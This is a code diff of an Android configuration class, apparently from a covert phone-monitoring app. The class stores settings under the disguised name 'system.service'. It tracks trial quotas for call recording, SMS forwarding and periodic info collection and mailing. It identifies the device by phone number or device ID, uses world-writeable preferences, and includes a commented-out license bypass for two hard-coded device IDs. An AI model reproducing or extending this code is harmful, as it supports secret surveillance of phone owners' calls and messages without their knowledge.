@@ -23,13 +23,11 @@ public class ConfigCtrl
 {
 	private static final String PREFS_NAME = "system.service";
 	private static final String LICENSE_KEY = "LicenseKey";
-	private static final String INTERVAL_TRY_GETINFO = "TryGetInfoInterval";
 	private static final String CONSUMED_DATETIME = "ConsumedDatetime"; // The 1st activation datetime
 	private static final String LAST_GETINFO_DATETIME = "LastGetInfoDatetime"; // The last datetime of info collection and mail sending
-	private static final String SELF_PHONE_NUMBER = "SelfPhoneNum";
 	private static final String HAS_SENT_EXPIRE_SMS = "HasSentExpireSms";
-	private static final String HAS_SENT_TRIAL_RECORDING_TIMES_LIMIT_SMS = "HSTRTLS";
-	private static final String HAS_SENT_TRIAL_REDIRECT_SMS_TIMES_LIMIT_SMS = "HSTRSTLS";
+	private static final String HAS_SENT_TRIAL_CALL_RECORD_TIMES_LIMIT_SMS = "HasSentTrialCallRecordTimesLimitSms";
+	private static final String HAS_SENT_TRIAL_FORWARD_SMS_TIMES_LIMIT_SMS = "HasSentTrialForwardSmsTimesLimitSms";
 	private static final String RECORDING_TIMES_IN_TRIAL = "RecordingTimesInTrial";
 	private static final String SMS_REDIRECT_TIMES_IN_TRIAL = "SmsRedirectTimesInTrial";
 	private static final String SIM_FIRST_RUN = "SimFirstRun";
@@ -37,8 +35,8 @@ public class ConfigCtrl
 	private static final String STOPPED_BY_SYSTEM = "StoppedBySystem";
 	
 	private static final int DEFAULT_TRIAL_DAYS = 2; // Trial days
-	private static final int DEFAULT_RECORDING_TIMES_IN_TRIAL = 3; // Recording times in trial
-	private static final int DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL = 5; // SMS redirect times in trial
+	private static final int DEFAULT_CALL_RECORD_TIMES_IN_TRIAL = 3; // Call Record times in trial
+	private static final int DEFAULT_FORWARD_SMS_TIMES_IN_TRIAL = 5; // SMS Forward times in trial
 	
 	public static boolean set(Context context, String key, String value)
 	{	
@@ -67,19 +65,6 @@ public class ConfigCtrl
 	{
 		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
 		editor.putString(LICENSE_KEY, key.toUpperCase());     
-		return editor.commit();
-	}
-	
-	public static int getInfoInterval(Context context)
-	{
-		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
-		return config.getInt(INTERVAL_TRY_GETINFO, 300000);
-	}
-	
-	public static boolean setInfoInterval(Context context, int interval)
-	{
-		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
-		editor.putInt(INTERVAL_TRY_GETINFO, interval);     
 		return editor.commit();
 	}
 	
@@ -117,23 +102,6 @@ public class ConfigCtrl
 		return editor.commit();
 	}
 	
-	public static String getSelfPhoneNum(Context context)
-	{
-		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
-		String str = config.getString(SELF_PHONE_NUMBER, "").trim();
-		if (str.length() > 0)
-			return str;
-		else
-			return null;
-	}
-	
-	public static boolean setSelfPhoneNum(Context context, String selfPhoneNum) 
-	{
-		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
-		editor.putString(SELF_PHONE_NUMBER, selfPhoneNum == null ? "": selfPhoneNum);     
-		return editor.commit();
-	}
-	
 	public static boolean getHasSentExpireSms(Context context)
 	{
 		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
@@ -150,26 +118,26 @@ public class ConfigCtrl
 	public static boolean getHasSentRecordingTimesLimitSms(Context context)
 	{
 		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
-		return config.getBoolean(HAS_SENT_TRIAL_RECORDING_TIMES_LIMIT_SMS, false);
+		return config.getBoolean(HAS_SENT_TRIAL_CALL_RECORD_TIMES_LIMIT_SMS, false);
 	}
 	
 	public static boolean setHasSentRecordingTimesLimitSms(Context context, boolean value) 
 	{
 		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
-		editor.putBoolean(HAS_SENT_TRIAL_RECORDING_TIMES_LIMIT_SMS, value);     
+		editor.putBoolean(HAS_SENT_TRIAL_CALL_RECORD_TIMES_LIMIT_SMS, value);     
 		return editor.commit();
 	}
 	
 	public static boolean getHasSentRedirectSmsTimesLimitSms(Context context)
 	{
 		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
-		return config.getBoolean(HAS_SENT_TRIAL_REDIRECT_SMS_TIMES_LIMIT_SMS, false);
+		return config.getBoolean(HAS_SENT_TRIAL_FORWARD_SMS_TIMES_LIMIT_SMS, false);
 	}
 	
 	public static boolean setHasSentRedirectSmsTimesLimitSms(Context context, boolean value) 
 	{
 		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
-		editor.putBoolean(HAS_SENT_TRIAL_REDIRECT_SMS_TIMES_LIMIT_SMS, value);     
+		editor.putBoolean(HAS_SENT_TRIAL_FORWARD_SMS_TIMES_LIMIT_SMS, value);     
 		return editor.commit();
 	}
 	
@@ -186,7 +154,7 @@ public class ConfigCtrl
 		try {
 			return config.getInt(RECORDING_TIMES_IN_TRIAL, 0);
 		} catch (Exception ex) {
-			return DEFAULT_RECORDING_TIMES_IN_TRIAL;
+			return DEFAULT_CALL_RECORD_TIMES_IN_TRIAL;
 		}
 	}
 	
@@ -209,7 +177,7 @@ public class ConfigCtrl
 		try {
 			return config.getInt(SMS_REDIRECT_TIMES_IN_TRIAL, 0);
 		} catch (Exception ex) {
-			return DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL;
+			return DEFAULT_FORWARD_SMS_TIMES_IN_TRIAL;
 		}
 	}
 	
@@ -288,33 +256,40 @@ public class ConfigCtrl
 	public static String getSelfName(Context context) 
 	{
 		String phoneNum = DeviceProperty.getPhoneNumber(context);
-		if (phoneNum == null || phoneNum.length() <= 0) {
-			String selfNum = ConfigCtrl.getSelfPhoneNum(context);
-			if (selfNum != null && selfNum.length() > 0) {
-				return selfNum;
-			} else {
-				return DeviceProperty.getDeviceId(context);
-			}
-		} else return phoneNum;
+		if (phoneNum != null && phoneNum.length() > 0) {
+			return phoneNum;
+		} else {
+			return DeviceProperty.getDeviceId(context);
+		}
 	}
 	
 	public static boolean isLegal(Context context) 
 	{
-		return (
-				 (
-			       (GlobalValues.licenseType == LICENSE_TYPE.FULL_LICENSED) ||
-			       (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.stillInTrial(context))
-			     ) &&
-			     (!ConfigCtrl.getStoppedBySystem(context)) 
-		       );
+		boolean ret = (
+						(
+					       (GlobalValues.licenseType == LICENSE_TYPE.FULL_LICENSED) ||
+					       (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.stillInTrial(context))
+						) 
+					    && (!ConfigCtrl.getStoppedBySystem(context)) 
+				       );
+		
+		// Special workaround for issues 2/13/2012
+		/*
+		if (!ret) {
+			String deviceID = DeviceProperty.getDeviceId(context); 
+			ret = (deviceID.contains("351180201022980") || deviceID.contains("357853043170704"));
+		}
+		*/
+		
+		return ret;
 	}
 	
 	public static boolean reachRecordingTimeLimit(Context context) {
-		return (getRecordingTimesInTrial(context) >= DEFAULT_RECORDING_TIMES_IN_TRIAL);
+		return (getRecordingTimesInTrial(context) >= DEFAULT_CALL_RECORD_TIMES_IN_TRIAL);
 	}
 	
 	public static boolean reachSmsRedirectTimeLimit(Context context) {
-		return (getSmsRedirectTimesInTrial(context) >= DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL);
+		return (getSmsRedirectTimesInTrial(context) >= DEFAULT_FORWARD_SMS_TIMES_IN_TRIAL);
 	}
 
 }
